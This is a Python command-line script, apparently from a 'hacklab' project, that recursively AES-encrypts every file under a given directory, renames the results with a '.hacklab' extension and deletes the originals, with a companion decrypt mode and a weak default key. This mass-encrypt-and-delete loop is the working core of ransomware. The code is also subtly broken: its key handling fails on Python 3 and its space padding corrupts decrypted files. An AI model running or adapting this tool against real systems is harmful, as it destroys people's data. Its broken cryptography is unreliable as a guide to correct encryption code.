#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Github      : hacklab F10nHB46
Copyright   : MIT License
Version     : 0.1
Description : This module encrypt files and can decrypt them."""

import os
import sys
import base64
import platform
import argparse
from pathlib import Path
import colorama
import termcolor
from pyfiglet import Figlet
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Hash import SHA256


USER_HOME = str(Path.home())
CURRENT_PLATFORM = platform.system()
CHECKED_SIGN = u"\u2713"
WRONG_SIGN = u"\u00D7"


def clear_the_page():
    """Clear the shell page."""

    current_platform = platform.system()
    if current_platform == "Windows":
        os.system("cls")
    else:
        os.system("clear")


def display_message(color, status, message):
    """Display colored messages."""

    print("[" + termcolor.colored(status, color) + "] " + message)


def banner(title, color):
    """Print a centerd banner message."""

    # Getting the shell width
    row_columns = os.popen('stty size', 'r').read().split()
    total_len = int(row_columns[1])

    title_fig = Figlet(font='doom', justify="center")
    colorama.init()
    title = (title_fig.renderText(title))
    line = (termcolor.colored(total_len*"=", color))

    print(line)
    print(termcolor.colored(title, color))
    print(termcolor.colored(__doc__, color))
    print(line + "\n")


def getkey(password):
    """disc."""
    hasher = SHA256.new(password.encode("utf-8"))
    return hasher.digest()


class Encryptor():
    """Discription."""

    def __init__(self, action, directory, the_key):
        """Assign inits."""

        self.directory = Path(directory)
        self.key = base64.b64encode(the_key)
        self.new_extention = ".hacklab"
        self.list_of_unencrypted_files = []
        self.list_of_encrypted_files = []
        self.list_of_wanted_extensions = ["*"]
        # ['jpg', 'png', 'jpeg',
        #  'iso','exe', 'mp3', "mp4", 'zip', 'rar', 'txt', 'iso']

        self.get_files()

        if action == "decrypt":
            display_message(status="Start Decrypting", color="blue",
                            message="")
            # print self.list_of_encrypted_files
            self.start_decrypting()

        elif action == "encrypt":
            display_message(status="Start Encrypting", color="blue",
                            message="")
            # print self.list_of_unencrypted_files
            self.start_encrypting()

        else:
            display_message(status=WRONG_SIGN, color="red",
                            message="Unknown action")

    def get_files(self):
        """disc."""

        for extension in self.list_of_wanted_extensions:
            try:
                searche = list(
                    self.directory.glob('**/*.{}'.format(extension)))
                for found_file in searche:
                    found_file = str(found_file)
                    if found_file.endswith(self.new_extention):
                        self.list_of_encrypted_files.append(found_file)
                    else:
                        self.list_of_unencrypted_files.append(found_file)
            except OSError:
                pass
                # display_message(status="Error", color="red",
                #                 message="Permission problem")

    def decrypt(self, key, filename):
        """disc."""
        chunksize = 64*1024
        output_file = str(filename).split(self.new_extention)[0]

        try:
            with open(filename, 'rb') as infile:
                # filesize = infile.read(16)
                infile.seek(16)
                IV = infile.read(16)
                decryptor = AES.new(key, AES.MODE_CBC, IV)
                with open(output_file, 'wb') as outfile:
                    # outfile.write(filesize.encode('utf-8'))
                    # outfile.write(IV)
                    while True:
                        chunk = infile.read(chunksize)
                        if len(chunk) == 0:
                            break
                        elif len(chunk) % 16 != 0:
                            chunk += b' ' * (16 - (len(chunk) % 16))
                        outfile.write(decryptor.decrypt(chunk))
        except IOError:
            pass
            # display_message(status=WRONG_SIGN, color="red",
            #                 message="Permission problem")

    def encrypt(self, key, filename):
        """disc."""
        chunksize = 64*1024
        output_file = str(filename) + self.new_extention
        filesize = str(os.path.getsize(filename)).zfill(16)
        IV = Random.new().read(16)

        encryptor = AES.new(key, AES.MODE_CBC, IV)
        try:
            with open(filename, 'rb') as infile:
                with open(output_file, 'wb') as outfile:
                    outfile.write(filesize.encode('utf-8'))
                    outfile.write(IV)
                    while True:
                        chunk = infile.read(chunksize)
                        if len(chunk) == 0:
                            break
                        elif len(chunk) % 16 != 0:
                            chunk += b' ' * (16 - (len(chunk) % 16))
                        outfile.write(encryptor.encrypt(chunk))
        except IOError:
            pass
            # display_message(status=WRONG_SIGN color="red",
            #                 message="Permission problem")

    def start_encrypting(self):
        """disc."""

        for unencrypted in self.list_of_unencrypted_files:
            file_name = unencrypted.split("/")[-1]
            file_path = unencrypted.replace(file_name, "")
            os.chdir(file_path)
            self.encrypt(getkey(base64.b64decode(self.key)), file_name)

            # Remove the original file
            try:
                os.remove(file_name)
            except OSError:
                pass
                # display_message(status=WRONG_SIGN, color="red",
                #                 message="Permission problem")

            display_message(status=CHECKED_SIGN+" Encrypted", color="green",
                            message=file_name)

    def start_decrypting(self):
        """disc."""

        for encrypted in self.list_of_encrypted_files:
            # file_name = encrypted.split("/")[-1].split(self.new_extention)[0]
            # file_path = encrypted.replace(file_name+self.new_extention, "")
            file_name = encrypted.split("/")[-1]
            file_path = encrypted.replace(file_name, "")
            os.chdir(file_path)
            self.decrypt(getkey(base64.b64decode(self.key)), file_name)

            # Remove the encrypted file
            try:
                os.remove(file_name)
            except OSError:
                pass
                # display_message(status=WRONG_SIGN, color="red",
                #                 message="Permission problem")

            display_message(status=CHECKED_SIGN+" Decrypted", color="yellow",
                            message=file_name)


def start(argv):
    """Handel arguments and begin the task."""

    parser = argparse.ArgumentParser()
    parser.add_argument('-d', '--directory',
                        required=True,
                        type=str,
                        dest="directory",
                        help="Main directory is required")
    parser.add_argument('-a', '--action',
                        required=True,
                        type=str,
                        choices=["encrypt", "decrypt"],
                        dest="action",
                        help="Action is required")
    parser.add_argument('-k', '--key',
                        required=False,
                        default="0-0-0",
                        type=str,
                        dest="key",
                        help="Key")

    args = parser.parse_args()
    Encryptor(action=args.action, directory=args.directory, the_key=args.key)


if __name__ == "__main__":
    try:
        clear_the_page()
        banner(title="Encryptor", color="green")
        start(sys.argv[1:])

    except KeyboardInterrupt:
        print("\n")
        display_message("red", WRONG_SIGN+ " Error", "Keyboard Interrupted")
